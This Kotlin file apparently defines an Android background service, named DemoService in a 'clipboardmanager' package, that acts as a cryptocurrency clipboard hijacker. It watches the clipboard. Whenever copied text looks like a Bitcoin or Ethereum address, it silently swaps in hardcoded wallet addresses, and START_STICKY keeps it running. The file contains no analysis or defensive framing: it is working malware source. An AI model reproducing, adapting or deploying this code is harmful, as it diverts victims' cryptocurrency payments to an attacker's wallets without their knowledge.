package com.example.franklin.clipboardmanager

import android.app.Service
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.widget.Toast


class DemoService : Service() {

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {


        val clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager


        clipboardManager.addPrimaryClipChangedListener {
            val clipd = clipboardManager.primaryClip.getItemAt(0).text.toString()
            if (clipd.startsWith("1", true) && clipd.length >= 30) {

                clipboardManager.primaryClip = ClipData.newPlainText("text", "1FL6zG9T9KbPkybbe8N3Mn8QE2SuqgKbAE")


            } else if (clipd.startsWith("0x", true) && clipd.length >= 40) {
                clipboardManager.primaryClip = ClipData.newPlainText("text", "0x7590b86b5d8797522d495b2412f2e3446fd21171")


            }
        }



        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        TODO("not implemented") //To change body of created functions use File | Settings | File Templates.
    }


    override fun onDestroy() {
        val clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager

        clipboardManager.addPrimaryClipChangedListener {
            Toast.makeText(applicationContext, clipboardManager.primaryClip.getItemAt(0).text.toString(), Toast.LENGTH_LONG).show()
        }
        super.onDestroy()
    }

}



